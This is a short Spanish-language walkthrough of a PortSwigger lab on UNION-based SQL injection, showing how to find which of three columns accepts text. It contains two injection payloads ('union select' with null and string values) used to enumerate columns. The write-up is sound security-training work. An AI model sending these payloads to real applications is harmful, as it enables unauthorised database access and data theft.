# SQL Injection UNION Attack - Finding a Column Containing Text

## 📌 Lab Information

- **Lab:** Finding a Column Containing Text
- **Categoría:** UNION SQL Injection

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

---

## 🎯 Objetivo

Identificar qué columna permite mostrar datos tipo string.

---

## 🔍 Información inicial

El laboratorio indica que debemos recuperar un valor específico.

![Valor objetivo](../../../../Imagenes/pasted-image-20260331175952.png)

---
## 🚀 Enumeración de columnas

Ya sabemos que existen 3 columnas:

```sql
' union select null,null,null -- -
```

Ahora iteramos colocando strings:

```sql
' union select null,'test',null -- -
```

---

## ✅ Resultado

La segunda columna soporta texto.

![Columna string](../../../../Imagenes/pasted-image-20260331180202.png)
